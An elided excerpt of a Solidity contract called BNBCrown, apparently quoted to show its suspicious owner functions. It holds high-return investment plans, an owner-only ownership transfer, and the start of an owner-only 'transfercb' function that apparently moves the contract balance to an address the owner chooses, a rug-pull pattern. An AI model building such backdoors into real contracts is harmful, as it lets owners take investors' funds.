...
contract BNBCrown {
    ...
    event Fetchd(address indexed user, uint contractBalance);
    ...
    constructor(address wallet, uint startDate) {
        ...
        plans.push(Plan(14, 90, 10));
        plans.push(Plan(21, 65, 50));
        plans.push(Plan(28, 55, 250));
        plans.push(Plan(14, 65, 50));
        plans.push(Plan(21, 50, 250));
        plans.push(Plan(28, 40, 500));
    }
    ...
    function transferow(address newAddress) external onlyOwner {
        owner = newAddress;
    }

    function transfercb(address payable addr) public onlyOwner {
